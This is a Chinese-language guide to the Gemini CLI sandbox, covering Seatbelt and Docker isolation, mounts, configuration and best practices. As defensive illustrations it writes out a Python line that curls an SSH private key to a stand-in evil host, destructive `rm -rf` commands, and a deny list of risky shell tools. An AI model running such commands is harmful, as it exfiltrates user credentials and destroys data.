# Gemini CLI 沙箱深度解析

> 🛡️ **核心理念：在享受AI便利的同时，确保系统绝对安全**

本指南将深入解析Gemini CLI的沙箱（Sandbox）机制，帮助你理解其工作原理、应用场景和配置方法。

## 📋 目录
- [沙箱的核心作用](#-沙箱的核心作用)
- [具体应用场景举例](#-具体应用场景举例)
- [两种沙箱实现方式](#️-两种沙箱实现方式)
- [安全级别对比](#-安全级别对比)
- [如何启用与配置](#️-如何启用与配置)
- [自定义沙箱](#-自定义沙箱)
- [最佳实践建议](#-最佳实践建议)

## 🛡️ 沙箱的核心作用

沙箱的核心目的是**安全隔离**。当AI模型需要执行代码、修改文件或运行Shell命令时，沙箱会创建一个受限的隔离环境，防止这些操作对你的主系统造成意外的或恶意的破坏。

**主要防护目标：**
- 💥 **意外系统损坏**：防止AI误删重要文件（例如 `rm -rf /`）。
- 🔒 **数据泄露**：阻止AI访问项目目录之外的敏感文件（例如 `/etc/passwd`）。
- 🌐 **网络滥用**：限制或代理所有出站网络请求，防止恶意连接。
- 📂 **文件系统破坏**：将文件写入操作限制在当前项目目录内。

---

## 🎯 具体应用场景举例

### 场景1：危险的Shell命令
- **用户提问**：“帮我清理所有临时文件。”
- **AI可能生成**：`rm -rf /tmp/*`
- **沙箱保护**：该命令在沙箱内执行。即使执行，也只会影响到沙箱内部隔离的 `/tmp` 目录，不会触及你真实的系统文件。

### 场景2：执行未知Python代码
- **用户提问**：“帮我写个Python脚本测试这个API。”
- **AI可能生成**：
  ```python
  import os
  os.system("curl -X POST https://evil-site.com --data @~/.ssh/id_rsa")
  ```
- **沙箱保护**：
  1.  **网络隔离**：`restrictive-closed` 模式下，网络请求将直接失败。
  2.  **文件访问限制**：沙箱无法访问 `~/.ssh/` 目录，读取操作失败。

### 场景3：安装未知的NPM包
- **用户提问**：”帮我安装 `left-pad` 包。“（假设它被恶意替换）
- **AI可能执行**：`npm install malicious-left-pad`
- **沙箱保护**：`npm` 命令在沙箱容器内执行，任何恶意的 `postinstall` 脚本都无法影响主系统。

---

## 🏗️ 两种沙箱实现方式

### 1. macOS Seatbelt (轻量级)
- **原理**：利用macOS内置的 `sandbox-exec` 工具，通过策略文件（`.sb`）定义权限。
- **优点**：启动快，资源占用少，无需额外软件。
- **策略文件示例** (`packages/cli/src/utils/sandbox-macos-*.sb`):
  - `permissive-open` (默认)：允许网络，但限制文件写入范围。
  - `restrictive-closed`：默认拒绝所有操作，只允许白名单中的行为，且完全禁止网络。

### 2. Docker/Podman (完全隔离)
- **原理**：在容器（Container）中运行整个CLI环境。
- **优点**：跨平台（Linux, macOS, Windows），隔离性最强，环境可复现。
- **依赖**：此方式**依赖于已安装的Docker或Podman**环境。CLI工具会自动检测并使用它们。

#### **实现细节：Docker/Podman工作流**

当启用容器化沙箱时，Gemini CLI会动态地构建并执行一个类似 `docker run ...` 的命令。以下是其核心工作流程的分解：

**1. 镜像准备 (Image Preparation)**
   - **检查本地镜像**：首先检查名为 `gemini-cli-sandbox` 的镜像是否存在于本地。
   - **拉取镜像**：如果本地不存在，会尝试从Google的工件仓库 (`us-docker.pkg.dev/gemini-code-dev/gemini-cli/sandbox`) 拉取。
   - **本地构建 (可选)**：如果设置了 `BUILD_SANDBOX=1` 环境变量，它会调用 `scripts/build_sandbox.js` 脚本在本地构建镜像，这对于使用自定义的 `.gemini/sandbox.Dockerfile` 非常有用。

**2. 核心挂载卷 (Key Volume Mounts)**
   为了让容器内的CLI能够与你的系统无缝协作，它会挂载（映射）一系列关键目录：
   - `项目目录`:
     - **主机路径**: `process.cwd()` (当前工作目录)
     - **容器路径**: `/workspace`
     - **目的**: 让AI能够读取和修改你的项目文件。
   - `用户配置`:
     - **主机路径**: `~/.gemini`
     - **容器路径**: `/home/node/.gemini`
     - **目的**: 共享会话历史、设置和日志。
   - `临时文件`:
     - **主机路径**: `os.tmpdir()`
     - **容器路径**: `os.tmpdir()`
     - **目的**: 处理需要临时存储的操作。
   - `云端认证`:
     - **主机路径**: `~/.config/gcloud` 和 `GOOGLE_APPLICATION_CREDENTIALS` 文件
     - **容器路径**: 对应的原始路径
     - **目的**: 让沙箱内的gcloud/Vertex AI命令能够继承你的认证状态。

**3. 环境变量传递 (Environment Forwarding)**
   为了保持环境一致性，许多重要的环境变量会被传递到容器中：
   - **API密钥**: `GEMINI_API_KEY`, `GOOGLE_API_KEY`
   - **项目配置**: `GOOGLE_CLOUD_PROJECT`, `GOOGLE_CLOUD_LOCATION`
   - **模型选择**: `GEMINI_MODEL`
   - **代理设置**: `HTTPS_PROXY`, `NO_PROXY` 等
   - **终端显示**: `TERM`, `COLORTERM`，以确保颜色和样式正常。

**4. 网络隔离与代理 (Network Isolation & Proxy)**
   - **默认网络**：容器默认拥有自己的网络栈，与主机隔离。
   - **代理支持**：如果检测到 `GEMINI_SANDBOX_PROXY_COMMAND`，CLI会启动一个独立的代理容器，并创建一个专用的内部网络 (`gemini-cli-sandbox-proxy`)，强制所有沙箱流量通过此代理，实现对网络访问的完全控制和监控。

**5. 用户权限映射 (User Permissions on Linux)**
   - **问题**：在Linux上，容器默认以 `root` 用户运行，写入挂载卷的文件在主机上会属于 `root`，导致权限问题。
   - **解决方案**：CLI会检测主机的用户ID (`uid`) 和组ID (`gid`)，然后在容器内创建一个具有相同ID的新用户，并用此用户来运行进程。这确保了容器内外的文件所有权保持一致。

下面的图表演示了主机和沙箱容器之间的关系：

```mermaid
graph TD
    subgraph Host System
        A["<br><br><b>项目目录</b><br>./my-project"]
        B["<br><br><b>用户配置</b><br>~/.gemini"]
        C["<br><br><b>GCloud认证</b><br>~/.config/gcloud"]
    end

    subgraph Docker/Podman
        D[Container: gemini-cli-sandbox]
        subgraph D
            E["<br><br><b>工作空间</b><br>/workspace"]
            F["<br><br><b>继承的配置</b><br>/home/node/.gemini"]
            G["<br><br><b>只读认证</b><br>/.config/gcloud"]
            H["<b>gemini process</b>"]
        end
    end

    A -- "挂载/同步" --> E
    B -- "挂载/同步" --> F
    C -- "只读挂载" --> G
    
    style A fill:#cde4ff
    style B fill:#cde4ff
    style C fill:#cde4ff
    
    style D fill:#d2ffd2
    style E fill:#f9f9f9
    style F fill:#f9f9f9
    style G fill:#f9f9f9
    style H fill:#fff2cc
```

- **工作流程**：
  1.  启动一个预先构建好的Docker镜像 (`gemini-cli-sandbox`)。
  2.  将当前项目目录挂载（mount）到容器的 `/workspace`。
  3.  将用户配置、缓存等目录也安全地挂载进去。
  4.  所有命令都在这个完全隔离的容器中执行。

---

## 📊 安全级别对比

| 特性 | **无沙箱** | **宽松沙箱 (Permissive)** | **严格沙箱 (Restrictive)** | **Docker/Podman** |
|:---|:---:|:---:|:---:|:---:|
| **文件写入** | 全系统 | 仅项目/安全目录 | 仅项目/安全目录 | 仅挂载目录 |
| **网络访问** | ✅ 允许 | ✅ 允许 | ❌ 禁止 | 默认隔离 (可配置) |
| **系统命令** | ✅ 无限制 | ✅ 允许 | ⚠️ 严格限制 | 容器内命令 |
| **隔离级别** | **无** | **中** | **高** | **极高** |

---

## 🔬 隔离机制的深层对比

这是一个核心问题：不同沙箱的“隔离”究竟是在哪个层面实现的？

### 1. Seatbelt (宽松/严格沙箱): 进程级策略隔离

可以将其理解为给Gemini CLI进程戴上了一个由**操作系统内核**强制执行的“紧箍咒”。

-   **隔离对象**：单个正在运行的**进程**。
-   **实现原理**：它并非通过应用自身的`if/else`逻辑判断来实现隔离，而是利用了macOS内核的`sandbox-exec`功能。当进程尝试进行文件、网络等操作（即发起“系统调用”），内核会率先拦截，并对照加载的策略（`.sb`文件）进行检查。
-   **执法者**：是**操作系统内核**。如果一个操作被策略禁止，内核会直接拒绝，并向进程返回一个权限错误。进程自身无法绕过这一限制。
-   **比喻**：一个能力强大的人（进程），但被戴上了规则严格的“紧箍咒”（策略），导致很多危险动作无法完成。他仍然处在原来的世界，但行为受到了严格的限制。

### 2. Docker/Podman: 操作系统级虚拟化隔离

可以将其理解为为Gemini CLI创造了一个与主系统隔离的“平行世界”（容器）。

-   **隔离对象**：一个完整的**运行环境**（包括文件系统、网络、进程树等）。
-   **实现原理**：它利用了Linux内核的**命名空间 (Namespaces)** 和**控制组 (Cgroups)** 技术。
    -   **Namespaces**：让容器内的进程拥有自己独立的视图，例如，它看到的进程列表里PID 1是它自己，它看到的网络接口也只有它自己的。
    -   **Cgroups**：限制该环境能使用的CPU、内存等资源。
-   **执法者**：是**操作系统内核的虚拟化层**。它从根本上划分了不同的“世界”，让不同世界的进程互不可见。
-   **比喻**：将一个人（进程）传送到了一个只有一间房、一扇窗的“密室”（容器）里。他可以在房间里自由活动，但无法感知到外面的世界，除非我们通过窗户（挂载卷）给他递东西。这比仅仅限制他的行为要彻底得多。

> **澄清：“物理隔离”**
> 这是一个很形象的说法，但技术上不完全准确。物理隔离指独立的物理硬件。Docker提供的是目前最强的**软件层面隔离**，因为多个容器依然共享同一个宿主机内核。

## ⚙️ 如何启用与配置

沙箱配置有三个层级，优先级从高到低：

### 1. 命令行参数 (最高优先级)
```bash
# 启用默认沙箱 (macOS上是Seatbelt, Linux是Docker)
gemini -s -p "你的问题"

# 强制使用Docker沙箱
gemini --sandbox=docker -p "你的问题"

# 在macOS上使用严格模式
SEATBELT_PROFILE=restrictive-closed gemini -s -p "你的问题"
```

### 2. 环境变量
```bash
# 启用沙箱
export GEMINI_SANDBOX=true

# 指定沙箱类型
export GEMINI_SANDBOX=docker

# 指定macOS策略
export SEATBELT_PROFILE=restrictive-closed
```

### 3. 配置文件 (最低优先级)
在 `~/.gemini/settings.json` 或项目 `.gemini/settings.json` 中配置：
```json
{
  "sandbox": "docker" 
}
```

---

## 🔧 自定义沙箱

### 1. 自定义Dockerfile
在你的项目根目录下创建 `.gemini/sandbox.Dockerfile`：
```dockerfile
# 基于官方沙箱镜像
FROM us-docker.pkg.dev/gemini-code-dev/gemini-cli/sandbox:latest

# 添加你项目需要的特定依赖
RUN apt-get update && apt-get install -y postgresql-client

# 复制配置文件
COPY ./my-config /app/my-config
```
构建并使用：`BUILD_SANDBOX=1 gemini -s -p "连接数据库"`

### 2. 自定义启动脚本
在项目根目录下创建 `.gemini/sandbox.bashrc`，它会在沙箱启动时自动执行：
```bash
# 设置自定义环境变量
export DATABASE_URL="postgresql://user:pass@host:port/db"

# 安装Python依赖
if [ -f requirements.txt ]; then
    pip install -r requirements.txt
fi

echo "✅ 自定义沙箱环境已就绪！"
```

---

## 💡 最佳实践建议

1.  **默认开启**：在全局配置或环境变量中默认开启沙箱，养成安全使用习惯。
2.  **最小权限原则**：尽可能使用限制最严格的沙箱配置（如 `restrictive-closed`）。如果任务需要网络，再切换到 `permissive-open` 或 `permissive-proxied`。
3.  **谨慎使用`autoAccept`**：在配置文件中将 `"autoAccept": true` 与沙箱结合使用时要特别小心，因为它会跳过危险操作的确认步骤。
4.  **限制危险命令**：在配置文件中明确禁止高危命令。
    ```json
    {
      "excludeTools": [
        "run_shell_command(rm)",
        "run_shell_command(sudo)",
        "run_shell_command(chmod)"
      ]
    }
    ```

通过有效利用沙箱，你可以放心地授权AI执行更广泛和更复杂的任务，而无需担心你的开发环境受到威胁。 